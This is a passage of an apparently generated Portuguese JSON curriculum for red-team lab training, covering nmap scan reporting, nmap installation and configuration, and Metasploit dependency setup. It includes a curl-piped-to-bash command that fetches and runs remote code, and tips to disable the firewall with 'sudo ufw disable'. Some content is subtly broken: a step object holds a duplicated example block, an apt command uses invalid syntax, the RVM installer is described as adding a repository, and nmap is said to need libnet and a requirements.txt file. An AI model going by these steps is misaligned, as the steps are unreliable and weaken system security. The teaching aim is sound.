                                    "Inclua capturas de tela dos outputs do nmap no relatório.",
                                    "Crie uma tabela com colunas: IP, Porta, Serviço, Versão, Estado."
                                  ],
                                  "verification": "Tabela populada com pelo menos 80% das portas escaneadas e serviços identificados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Nmap",
                                    "Ferramenta de screenshot (Snipping Tool)",
                                    "Relatório template (Word/Markdown)"
                                  ],
                                  "tips": "Salve outputs em XML com -oX para importação posterior em ferramentas como Zenmap.",
                                  "learningObjective": "Mapear superfície de ataque através de serviços expostos.",
                                  "commonMistakes": [
                                    "Escaneio superficial (-p 1-1000)",
                                    "Ignorar portas UDP",
                                    "Não capturar banners"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar e Registrar Vulnerabilidades (CVEs)",
                                  "subSteps": [
                                    "Use 'nmap --script vuln <IP>' ou OpenVAS/Nessus para scan de vulns.",
                                    "Pesquise CVEs conhecidos para serviços identificados no NIST NVD ou Exploit-DB.",
                                    "Liste CVEs com score CVSS, descrição breve e impacto potencial (ex: CVE-2021-41773).",
                                    "Priorize vulns high/critical e anote provas de conceito (PoCs) se aplicável.",
                                    "Adicione seção 'Vulnerabilidades Identificadas' com tabela: CVE, Serviço Afetado, Severidade."
                                  ],
                                  "verification": "Pelo menos 3 CVEs documentados por VM com links para detalhes.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Nmap NSE scripts",
                                    "Acesso a NVD.cve.org",
                                    "Nessus/OpenVAS opcional"
                                  ],
                                  "tips": "Filtre scripts por serviço: --script 'http-vuln*,ssh-vuln*' para foco.",
                                  "learningObjective": "Associar serviços a vulnerabilidades conhecidas e quantificá-las.",
                                  "commonMistakes": [
                                    "Listar vulns sem evidência",
                                    "Ignorar CVSS scores",
                                    "CVEs irrelevantes ao SO/serviço"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Capturar Snapshots, Incluir RoE e Finalizar Relatório",
                                  "subSteps": [
                                    "Tire snapshots das VMs no hypervisor (VirtualBox/VMware) rotulando com data/IP.",
                                    "Escreva seção de Regras de Engajamento (RoE): escopo, limites, contatos de emergência.",
                                    "Compile tudo em relatório estruturado: sumário executivo, inventário, serviços, vulns, anexos.",
                                    "Adicione diagrama de rede (use draw.io) e hash de arquivos para integridade.",
                                    "Revise por completude e exporte em PDF."
                                  ],
                                  "verification": "Relatório PDF completo com todas seções, snapshots linkados e RoE assinada.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Hypervisor para snapshots",
                                    "Draw.io ou Visio",
                                    "Template de relatório"
                                  ],
                                  "tips": "Use Git para versionar o relatório e evitar perda de dados.",
                                  "learningObjective": "Produzir documentação profissional pronta para uso em operações Red Team.",
                                  "commonMistakes": [
                                    "RoE vaga ou ausente",
                                    "Sem hashes/integridade",
                                    "Relatório desorganizado"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com 3 VMs vulneráveis (Metasploitable, DVWA, VulnHub), escaneie 192.168.56.0/24, documente IP 192.168.56.101 com Apache 2.4.29 (CVE-2017-9798), ports 80/open, 22/open (SSH), snapshots nomeados 'Target1-PreAttack-2023-10-01', RoE limitando a rede interna sem DoS.",
                              "finalVerifications": [
                                "Relatório contém todos IPs, ports e CVEs com evidências.",
                                "Snapshots de VMs acessíveis e rotulados corretamente.",
                                "RoE clara com escopo, regras e assinaturas.",
                                "Tabelas/diagramas legíveis e completos.",
                                "Hashes de arquivos incluídos para verificação de integridade.",
                                "Sem erros de digitação ou informações incompletas."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todas seções presentes e detalhadas (30%)",
                                "Precisão: Scans/validações corretas sem falsos positivos (25%)",
                                "Clareza: Formatação profissional, tabelas/diagramas (20%)",
                                "Profundidade: CVEs priorizados com CVSS e PoCs (15%)",
                                "Praticidade: RoE acionável e snapshots usáveis (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Relatórios Técnicos (Comunicação Empresarial)",
                                "Gestão de Projetos (Documentação de Deliverables)",
                                "Análise de Dados (Tabelas e Visualizações)",
                                "Ética Profissional (Regras de Engajamento)"
                              ],
                              "realWorldApplication": "Em engajamentos de pentest Red Team, este relatório serve como briefing para operadores, handover para Blue Team e evidência legal/compliance, evitando ambiguidades que poderiam escalar para incidentes reais."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.3.3.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.4",
                    "name": "Instalação de Ferramentas de Red Team",
                    "description": "Configuração de ferramentas como Metasploit, Nmap e Cobalt Strike no ambiente de ataque.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.4.1",
                        "name": "Instalação do Nmap",
                        "description": "Configuração inicial do Nmap, uma ferramenta essencial para varredura de rede e descoberta de hosts em ambientes de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.1.1",
                            "name": "Verificar pré-requisitos e compatibilidade do sistema",
                            "description": "Identificar o sistema operacional (Linux, Windows ou Kali Linux), verificar versão mínima requerida (Nmap 7.0+), instalar bibliotecas como libpcap e libnet via gerenciadores de pacotes (apt, yum ou brew).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar o Sistema Operacional e sua Versão",
                                  "subSteps": [
                                    "Execute comandos apropriados para detectar o SO: 'uname -a' ou 'cat /etc/os-release' no Linux/Kali, 'systeminfo' ou 'ver' no Windows, 'sw_vers' no macOS.",
                                    "Anote o nome do SO (ex: Ubuntu 22.04, Windows 10, Kali 2023.1) e arquitetura (x86_64, ARM).",
                                    "Confirme se o SO é suportado pelo Nmap 7.0+ (todos os principais SO modernos são).",
                                    "Identifique o gerenciador de pacotes: apt (Debian/Ubuntu/Kali), yum/dnf (RHEL/CentOS), brew (macOS), choco (Windows).",
                                    "Registre a versão do SO para verificação de compatibilidade mínima."
                                  ],
                                  "verification": "Output dos comandos mostra SO, versão e arquitetura corretamente identificados e anotados em um log ou relatório.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Terminal ou Prompt de Comando",
                                    "Acesso root/administrador"
                                  ],
                                  "tips": "Use 'hostnamectl' no systemd para info completa; evite suposições, sempre verifique com comandos.",
                                  "learningObjective": "Dominar comandos de identificação de SO para preparar instalações seguras.",
                                  "commonMistakes": [
                                    "Executar comandos errados para o SO",
                                    "Ignorar arquitetura (32-bit vs 64-bit)",
                                    "Não anotar versões exatas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Verificar Requisitos Mínimos para Nmap 7.0+",
                                  "subSteps": [
                                    "Consulte documentação oficial do Nmap (nmap.org) para requisitos: SO moderno, glibc 2.14+ no Linux, Visual Studio no Windows.",
                                    "Verifique versão mínima do SO: Linux kernel 2.6+, Windows 7+, macOS 10.12+.",
                                    "Teste dependências básicas: verifique se 'gcc' e 'make' estão disponíveis (necessários para compile futuro).",
                                    "Execute 'ldd --version' ou 'gcc --version' para checar compatibilidade de bibliotecas.",
                                    "Registre se todos os requisitos são atendidos ou liste gaps."
                                  ],
                                  "verification": "Relatório confirma que SO e ferramentas básicas atendem Nmap 7.0+; nenhum requisito crítico falhou.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Acesso à internet para docs.nmap.org",
                                    "Terminal"
                                  ],
                                  "tips": "Baixe o requirements.txt ou cheque release notes do Nmap GitHub para precisão.",
                                  "learningObjective": "Entender e validar pré-requisitos de software para evitar falhas de instalação.",
                                  "commonMistakes": [
                                    "Pular verificação de glibc/kernel",
                                    "Assumir compatibilidade sem checagem",
                                    "Ignorar docs oficiais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar Bibliotecas Essenciais (libpcap e libnet)",
                                  "subSteps": [
                                    "Atualize repositórios: 'sudo apt update' (Debian/Kali), 'sudo yum update' (RHEL), 'brew update' (macOS).",
                                    "Instale libpcap: 'sudo apt install libpcap-dev', 'sudo yum install libpcap-devel', 'brew install libpcap'.",
                                    "Instale libnet: 'sudo apt install libnet-dev', 'sudo yum install libnet-devel', 'brew install libnet'.",
                                    "Para Windows, use vcpkg ou baixe binários de winpcap/npcap e libnet-win32.",
                                    "Confirme instalação com 'pkg-config --modversion libpcap' e 'pkg-config --modversion libnet'."
                                  ],
                                  "verification": "Comandos 'dpkg -l | grep libpcap' (Linux) ou equivalentes mostram pacotes instalados; pkg-config retorna versões válidas.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Acesso root/sudo",
                                    "Conexão à internet",
                                    "Gerenciador de pacotes configurado"
                                  ],
                                  "tips": "Use '-dev' ou '-devel' para headers de desenvolvimento; em Kali, muitos já vêm pré-instalados.",
                                  "learningObjective": "Executar instalações de dependências via gerenciadores de pacotes de forma segura e idempotente.",
                                  "commonMistakes": [
                                    "Usar gerenciador errado para o SO",
                                    "Não atualizar repositórios primeiro",
                                    "Instalar runtime em vez de dev packages"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Compatibilidade Geral e Preparar para Nmap",
                                  "subSteps": [
                                    "Teste bibliotecas: compile um teste simples com libpcap (ex: captura de pacotes básica).",
                                    "Verifique conflitos: 'ldd /usr/lib/libpcap.so' para dependências resolvidas.",
                                    "Limpe cache de pacotes e verifique espaço em disco (>500MB livre).",
                                    "Crie um script de verificação automatizado com os comandos acima.",
                                    "Documente o ambiente completo em um arquivo README para o ambiente de Red Team."
                                  ],
                                  "verification": "Testes rodam sem erros; script de verificação passa 100%; ambiente pronto documentado.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Editor de texto",
                                    "Compilador gcc/make"
                                  ],
                                  "tips": "Automatize com um bash script para reutilização em múltiplos ambientes.",
                                  "learningObjective": "Validar e documentar setups para reprodutibilidade em operações cibernéticas.",
                                  "commonMistakes": [
                                    "Não testar libs instaladas",
                                    "Ignorar warnings de dependências",
                                    "Falta de documentação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em Kali Linux 2023.1: 'cat /etc/os-release' mostra PRETTY_NAME=\"Kali GNU/Linux Rolling\"; 'sudo apt update && sudo apt install libpcap-dev libnet-dev'; 'pkg-config --modversion libpcap' retorna '1.10.1'; ambiente pronto para compilar Nmap 7.94 sem erros.",
                              "finalVerifications": [
                                "SO e versão identificados corretamente com comandos padrão.",
                                "Requisitos Nmap 7.0+ confirmados (kernel, glibc, etc.).",
                                "libpcap e libnet instalados e versões dev confirmadas via pkg-config/dpkg.",
                                "Nenhum erro de dependências em testes básicos.",
                                "Ambiente documentado com log de comandos e outputs.",
                                "Espaço em disco e permissões verificados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação do SO e gerenciador (100% correto).",
                                "Uso correto de comandos sem erros de sintaxe.",
                                "Instalação bem-sucedida sem falhas ou workarounds.",
                                "Verificações finais passam com evidências (screenshots/logs).",
                                "Documentação clara e completa do processo.",
                                "Tempo dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de pacotes e dependências.",
                                "Programação: Compilação e linking de bibliotecas C.",
                                "Redes: Entendimento de captura de pacotes (pcap).",
                                "Segurança: Preparação de ambientes para ferramentas de pentest.",
                                "DevOps: Automatização de setups com scripts."
                              ],
                              "realWorldApplication": "Em um Red Team preparando CTF ou simulação de ataque, verificar pré-requisitos garante que Nmap compile e rode scans sem falhas, evitando downtime durante operações cibernéticas reais."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.1.2",
                            "name": "Baixar e instalar o Nmap",
                            "description": "Acessar o site oficial (nmap.org), baixar o pacote binário ou fonte, executar instalação via comandos como 'sudo apt install nmap' no Kali Linux ou 'nmap-<version>.exe /S' no Windows, resolvendo erros comuns de permissão.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar Pré-requisitos do Sistema",
                                  "subSteps": [
                                    "Identifique o sistema operacional (ex: Kali Linux ou Windows)",
                                    "Verifique privilégios de root/administrador com comandos como 'whoami' ou 'id'",
                                    "Atualize repositórios e pacotes: 'sudo apt update && sudo apt upgrade' no Linux",
                                    "Teste conectividade à internet com 'ping nmap.org'",
                                    "Crie uma pasta dedicada para downloads: 'mkdir ~/nmap-install'"
                                  ],
                                  "verification": "Lista de pré-requisitos confirmados e pasta criada visível com 'ls ~/nmap-install'",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal ou Command Prompt",
                                    "Conexão à internet estável"
                                  ],
                                  "tips": [
                                    "Execute como root/sudo desde o início para evitar problemas de permissão",
                                    "Faça backup de configurações do sistema antes de atualizações"
                                  ],
                                  "learningObjective": "Compreender e preparar o ambiente do sistema para instalação segura de ferramentas de rede",
                                  "commonMistakes": [
                                    "Ignorar atualizações de pacotes levando a conflitos",
                                    "Executar sem privilégios elevados"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Acessar o Site Oficial e Baixar o Nmap",
                                  "subSteps": [
                                    "Abra o navegador e navegue para https://nmap.org/download.html",
                                    "Selecione a seção de download para o seu SO (Linux ou Windows)",
                                    "Escolha o pacote binário estável mais recente (ex: nmap-7.95-setup.exe para Windows)",
                                    "Baixe o arquivo para a pasta ~/nmap-install",
                                    "Verifique a integridade com checksum SHA256 fornecido no site usando 'sha256sum nmap-file' no Linux"
                                  ],
                                  "verification": "Arquivo baixado presente na pasta e checksum validado",
                                  "estimatedTime": "5 minutos",
                                  "materials": [
                                    "Navegador web (Firefox ou Chrome)",
                                    "Pasta de downloads criada"
                                  ],
                                  "tips": [
                                    "Sempre baixe do site oficial para evitar malwares",
                                    "Prefira versões binárias para instalação rápida"
                                  ],
                                  "learningObjective": "Aprender a obter software de fontes confiáveis e validar downloads",
                                  "commonMistakes": [
                                    "Baixar de sites não oficiais",
                                    "Pular verificação de checksum"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar o Nmap no Kali Linux",
                                  "subSteps": [
                                    "Navegue para a pasta: 'cd ~/nmap-install'",
                                    "Execute 'sudo apt install nmap' para instalação via gerenciador de pacotes",
                                    "Se usando binário ou fonte, extraia com 'tar -xzf nmap.tar.gz' e siga './configure && make && sudo make install'",
                                    "Atualize banco de dados NSE: 'sudo nmap --script-updatedb'",
                                    "Teste inicial: 'nmap --version'"
                                  ],
                                  "verification": "Comando 'nmap --version' retorna versão instalada sem erros",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal com sudo",
                                    "Pacote baixado ou repositórios apt"
                                  ],
                                  "tips": [
                                    "Use apt no Kali para dependências automáticas",
                                    "Reinicie terminal após instalação para PATH atualizar"
                                  ],
                                  "learningObjective": "Dominar instalação via gerenciador de pacotes em distribuições Linux de segurança",
                                  "commonMistakes": [
                                    "Esquecer sudo causando erros de permissão",
                                    "Não atualizar scripts NSE"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Instalar o Nmap no Windows",
                                  "subSteps": [
                                    "Execute o instalador como Administrador: clique direito em nmap-<version>.exe > Run as administrator",
                                    "Siga o wizard de instalação selecionando opções padrão (incluir Zenmap se desejado)",
                                    "Aceite licença e escolha pasta de instalação (padrão C:\\Program Files (x86)\\Nmap)",
                                    "Adicione ao PATH se não automático: edite variáveis de ambiente",
                                    "Teste no Command Prompt: 'nmap --version'"
                                  ],
                                  "verification": "'nmap --version' funciona no novo Command Prompt sem erros de PATH",
                                  "estimatedTime": "8 minutos",
                                  "materials": [
                                    "Instalador .exe baixado",
                                    "Privilégios de Administrador"
                                  ],
                                  "tips": [
                                    "Instale Npcap durante o processo para captura de pacotes",
                                    "Reinicie o PC se PATH não atualizar"
                                  ],
                                  "learningObjective": "Executar instalações gráficas e configurar PATH em ambientes Windows",
                                  "commonMistakes": [
                                    "Executar sem Admin",
                                    "Ignorar Npcap necessário para scans avançados"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Verificar e Testar a Instalação Completa",
                                  "subSteps": [
                                    "Execute 'nmap --version' e 'nmap -V' em ambos OS",
                                    "Realize scan básico: 'nmap localhost' ou 'nmap scanme.nmap.org'",
                                    "Verifique ajuda: 'nmap --help'",
                                    "Salve output em arquivo: 'nmap -oN install-test.txt localhost'",
                                    "Resolva erros comuns como permissões ou firewall"
                                  ],
                                  "verification": "Scan básico completo com resultados válidos e sem crashes",
                                  "estimatedTime": "7 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Target de teste público como scanme.nmap.org"
                                  ],
                                  "tips": [
                                    "Use -v para verbose em troubleshooting",
                                    "Documente erros e soluções"
                                  ],
                                  "learningObjective": "Validar funcionalidade e resolver problemas iniciais de instalação",
                                  "commonMistakes": [
                                    "Firewall bloqueando scans",
                                    "Confundir comandos de versão"
                                  ]
                                },
                                {
                                  "practicalExample": "Em um laboratório de Red Team no Kali Linux, baixe e instale o Nmap via 'sudo apt install nmap', execute 'nmap -sV -O 192.168.1.0/24' para descobrir serviços e OS na rede local simulando um ataque de reconhecimento.",
                                  "finalVerifications": [
                                    "'nmap --version' exibe versão >=7.90 sem erros",
                                    "Scan localhost ou scanme.nmap.org retorna hosts/uptime",
                                    "NSE scripts atualizados com 'nmap --script-updatedb'",
                                    "Instalação documentada em relatório com screenshots",
                                    "Nmap acessível de qualquer terminal/prompt"
                                  ],
                                  "assessmentCriteria": [
                                    "Processo completo sem erros fatais",
                                    "Tempo total <40 minutos",
                                    "Testes em pelo menos um SO com sucesso",
                                    "Relatório inclui checksums e outputs de comandos",
                                    "Demonstração de troubleshooting se erros ocorrerem"
                                  ],
                                  "crossCurricularConnections": [
                                    "Redes: Conceitos de portas, serviços e escaneamento",
                                    "Sistemas Operacionais: Gerenciadores de pacotes (apt, exe)",
                                    "Programação: Integração com scripts Python/ Bash para automação",
                                    "Ética e Direito: Licenças open-source e uso legal em pentests"
                                  ],
                                  "realWorldApplication": "Em operações de Red Team profissionais, o Nmap é instalado em VMs de ataque para mapear infraestruturas corporativas durante CTFs ou auditorias, identificando alvos para exploits simulados e fortalecendo defesas contra ameaças reais.",
                                  "stepNumber": "SC-06.1",
                                  "title": "Instalação e Verificação Inicial do Nmap no Kali Linux",
                                  "subSteps": [
                                    "Abra o terminal no Kali Linux.",
                                    "Atualize os repositórios: `sudo apt update`",
                                    "Instale o Nmap: `sudo apt install nmap`",
                                    "Verifique a instalação: `nmap --version`",
                                    "Atualize os scripts NSE: `nmap --script-updatedb`",
                                    "Execute um scan de teste: `nmap -sV -O scanme.nmap.org`"
                                  ],
                                  "verification": [
                                    "`nmap --version` exibe versão >=7.90 sem erros",
                                    "Scan em scanme.nmap.org retorna hosts e serviços detectados",
                                    "Scripts NSE atualizados sem warnings"
                                  ],
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Máquina virtual ou instalação nativa do Kali Linux",
                                    "Conexão à internet",
                                    "Terminal com privilégios sudo"
                                  ],
                                  "tips": [
                                    "Sempre execute comandos com `sudo` para evitar erros de permissão.",
                                    "Use `scanme.nmap.org` para testes legais; evite redes não autorizadas.",
                                    "Documente saídas com screenshots para o relatório.",
                                    "Se firewall bloquear, desative temporariamente com `sudo ufw disable`."
                                  ],
                                  "learningObjective": "Ao final desta etapa, o aluno será capaz de instalar, verificar e executar scans básicos com o Nmap no Kali Linux, preparando o ambiente para operações de reconnaissance em simulações de Red Team.",
                                  "commonMistakes": [
                                    "Esquecer `sudo`, resultando em 'Permission denied'.",
                                    "Não atualizar repositórios (`apt update`), causando falhas na instalação.",
                                    "Escaneamento de redes locais sem permissão ou configuração de VM.",
                                    "Ignorar verificação de versão, prosseguindo com instalação corrompida."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório de Red Team no Kali Linux, baixe e instale o Nmap via 'sudo apt install nmap', execute 'nmap -sV -O 192.168.1.0/24' para descobrir serviços e OS na rede local simulando um ataque de reconhecimento.",
                              "finalVerifications": [
                                "'nmap --version' exibe versão >=7.90 sem erros",
                                "Scan localhost ou scanme.nmap.org retorna hosts/uptime",
                                "NSE scripts atualizados com 'nmap --script-updatedb'",
                                "Instalação documentada em relatório com screenshots",
                                "Nmap acessível de qualquer terminal/prompt"
                              ],
                              "assessmentCriteria": [
                                "Processo completo sem erros fatais",
                                "Tempo total <40 minutos",
                                "Testes em pelo menos um SO com sucesso",
                                "Relatório inclui checksums e outputs de comandos",
                                "Demonstração de troubleshooting se erros ocorrerem"
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de portas, serviços e escaneamento",
                                "Sistemas Operacionais: Gerenciadores de pacotes (apt, exe)",
                                "Programação: Integração com scripts Python/ Bash para automação",
                                "Ética e Direito: Licenças open-source e uso legal em pentests"
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, o Nmap é instalado em VMs de ataque para mapear infraestruturas corporativas durante CTFs ou auditorias, identificando alvos para exploits simulados e fortalecendo defesas contra ameaças reais."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.4.1.3",
                            "name": "Configurar e testar a instalação",
                            "description": "Editar arquivos de configuração (/usr/local/share/nmap/nmap-service-probes), adicionar ao PATH se necessário, executar comandos de teste como 'nmap -v localhost' e 'nmap -sS 192.168.1.0/24' para validar varreduras SYN.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Localizar e editar o arquivo de configuração do Nmap",
                                  "subSteps": [
                                    "Abra o terminal em um ambiente Linux (ex: Ubuntu VM).",
                                    "Navegue até o diretório de configuração com 'cd /usr/local/share/nmap/'.",
                                    "Liste os arquivos com 'ls' para confirmar a presença de 'nmap-service-probes'.",
                                    "Faça backup do arquivo original: 'sudo cp nmap-service-probes nmap-service-probes.backup'.",
                                    "Edite o arquivo com um editor: 'sudo nano nmap-service-probes' e adicione ou modifique probes personalizados (ex: adicione uma linha para um serviço customizado)."
                                  ],
                                  "verification": "Abra o arquivo editado e confirme que as alterações foram salvas sem erros de sintaxe.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Terminal Linux",
                                    "Editor de texto (nano/vim)",
                                    "Privilégios sudo"
                                  ],
                                  "tips": "Sempre faça backup antes de editar arquivos de sistema para evitar perda de configuração padrão.",
                                  "learningObjective": "Entender a estrutura de arquivos de configuração do Nmap e realizar edições seguras.",
                                  "commonMistakes": [
                                    "Esquecer sudo para edição",
                                    "Sintaxe inválida nas probes causando falhas em scans futuros"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adicionar Nmap ao PATH do sistema se necessário",
                                  "subSteps": [
                                    "Verifique o PATH atual com 'echo $PATH' e localização do Nmap com 'which nmap'.",
                                    "Se não encontrado, localize o binário: 'find /usr -name nmap 2>/dev/null'.",
                                    "Edite o arquivo ~/.bashrc ou /etc/profile: 'nano ~/.bashrc'.",
                                    "Adicione a linha 'export PATH=$PATH:/usr/local/bin' (ajuste o caminho conforme encontrado).",
                                    "Recarregue o perfil: 'source ~/.bashrc' e teste com 'nmap --version'."
                                  ],
                                  "verification": "Comando 'nmap --version' executa sem 'command not found' e mostra a versão instalada.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Editor de texto"
                                  ],
                                  "tips": "Use caminhos absolutos para evitar ambiguidades em instalações customizadas.",
                                  "learningObjective": "Configurar variáveis de ambiente para acessibilidade global de ferramentas CLI.",
                                  "commonMistakes": [
                                    "Adicionar caminho incorreto",
                                    "Esquecer de recarregar o perfil com source"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar teste básico de instalação com verbose",
                                  "subSteps": [
                                    "Execute 'nmap -v localhost' para scan local verbose.",
                                    "Analise a saída: verifique detecção de portas abertas e serviços.",
                                    "Se firewall bloquear, desative temporariamente: 'sudo ufw disable'.",
                                    "Repita o scan e confirme saída detalhada sem erros.",
                                    "Salve a saída em arquivo: 'nmap -v localhost > teste_local.txt'."
                                  ],
                                  "verification": "Saída do comando lista hosts e portas sem crashes ou erros fatais.",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Terminal com Nmap no PATH"
                                  ],
                                  "tips": "Use -v para verbose debugging em testes iniciais.",
                                  "learningObjective": "Validar funcionalidade básica do Nmap em ambiente local.",
                                  "commonMistakes": [
                                    "Executar sem sudo em scans root-requeridos",
                                    "Ignorar warnings de firewall"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar varredura SYN stealth em rede local",
                                  "subSteps": [
                                    "Identifique sua sub-rede: 'ip route | grep default' (ex: 192.168.1.0/24).",
                                    "Execute 'nmap -sS 192.168.1.0/24' (ajuste IP conforme sua rede).",
                                    "Monitore a saída para hosts vivos, portas abertas e tempos de resposta.",
                                    "Compare com scan TCP padrão 'nmap -sT 192.168.1.0/24' para notar diferenças stealth.",
                                    "Salve resultados: 'nmap -sS 192.168.1.0/24 -oN syn_scan_results.txt'."
                                  ],
                                  "verification": "Scan completa sem timeouts excessivos e detecta hosts/ports conhecidos.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Terminal",
                                    "Acesso à rede local",
                                    "Hosts de teste (ex: roteador)"
                                  ],
                                  "tips": "SYN scan (-sS) requer root; use sudo para precisão.",
                                  "learningObjective": "Executar e validar scans stealth para simulações de Red Team.",
                                  "commonMistakes": [
                                    "Sub-rede errada causando scans inválidos",
                                    "Executar sem sudo resultando em scans incompletos"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Ubuntu simulando ambiente Red Team, edite nmap-service-probes para probe customizada de um serviço IoT, adicione /usr/local/bin ao PATH, rode 'sudo nmap -v localhost' confirmando portas SSH/HTTP, e 'sudo nmap -sS 192.168.1.0/24' detectando 5 hosts vivos com portas 80/443 abertas.",
                              "finalVerifications": [
                                "Nmap executa 'nmap --version' globalmente sem erros.",
                                "Arquivo nmap-service-probes editado e backup preservado.",
                                "Scan verbose localhost lista portas locais corretamente.",
                                "Scan SYN em sub-rede detecta hosts sem crashes.",
                                "Resultados salvos em arquivos legíveis.",
                                "Nenhuma alteração quebra funcionalidade padrão do Nmap."
                              ],
                              "assessmentCriteria": [
                                "Edições no arquivo de configuração são sintaticamente corretas e funcionais.",
                                "PATH configurado corretamente, acessível em nova sessão de terminal.",
                                "Testes executados com comandos exatos, incluindo sudo quando necessário.",
                                "Análise da saída demonstra compreensão de resultados (hosts, portas, serviços).",
                                "Tempo total dentro de 1 hora, indicando eficiência.",
                                "Documentação de saídas e backups completos."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entender scans TCP SYN e detecção de hosts.",
                                "Sistemas Operacionais: Gerenciamento de PATH e arquivos de sistema Linux.",
                                "Programação: Edição de arquivos texto e scripts bash para automação.",
                                "Ética em TI: Considerações legais em scans de rede real."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests, configurar Nmap customizado permite scans stealth para mapear redes corporativas, identificando vulnerabilidades sem detecção por IDS, essencial em jogos de guerra cibernética."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.4.1.2"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.4.2",
                        "name": "Instalação do Metasploit Framework",
                        "description": "Deploy do Metasploit, framework para desenvolvimento e execução de exploits em simulações de ataque Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.4.2.1",
                            "name": "Preparar ambiente e dependências",
                            "description": "Instalar Ruby (2.7+), PostgreSQL, bibliotecas como libssl-dev e libpcap-dev no Kali Linux via 'sudo apt update && sudo apt install metasploit-framework', configurar banco de dados com msfdb init.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Atualizar repositórios e instalar dependências de sistema",
                                  "subSteps": [
                                    "Abra o terminal no Kali Linux como usuário com privilégios sudo.",
                                    "Execute 'sudo apt update' para atualizar a lista de pacotes.",
                                    "Execute 'sudo apt upgrade -y' para atualizar pacotes existentes.",
                                    "Instale bibliotecas essenciais: 'sudo apt install -y libssl-dev libpcap-dev libreadline-dev libncurses5-dev libffi-dev libgdbm-dev libdb-dev uuid-dev'",
                                    "Verifique se não há erros de dependências pendentes com 'sudo apt autoremove && sudo apt autoclean'"
                                  ],
                                  "verification": "Comando 'apt list --upgradable' retorna lista vazia e bibliotecas instaladas via 'dpkg -l | grep libssl'",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Terminal Kali Linux",
                                    "Conexão à internet",
                                    "Acesso root/sudo"
                                  ],
                                  "tips": "Sempre execute update antes de installs para evitar conflitos de pacotes; use -y para automação em scripts.",
                                  "learningObjective": "Entender o processo de manutenção de repositórios APT e instalação de bibliotecas de baixo nível para ferramentas de segurança.",
                                  "commonMistakes": [
                                    "Pular 'apt update' causando falhas em installs",
                                    "Não usar sudo levando a erros de permissão",
                                    "Ignorar autoremove causando inchaço no sistema"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar Ruby versão 2.7 ou superior",
                                  "subSteps": [
                                    "Verifique versão atual com 'ruby --version'; se <2.7, prossiga.",
                                    "Adicione repositório Ruby se necessário: 'curl -sL https://raw.githubusercontent.com/rvm/rvm/master/install.sh | bash -s stable'.",
                                    "Instale via APT: 'sudo apt install -y ruby-full ruby-dev >=2.7'.",
                                    "Confirme instalação: 'ruby --version' deve mostrar >=2.7.",
                                    "Instale bundler: 'sudo gem install bundler'."
                                  ],
                                  "verification": "'ruby --version' retorna 2.7+ e 'gem --version' funciona sem erros.",
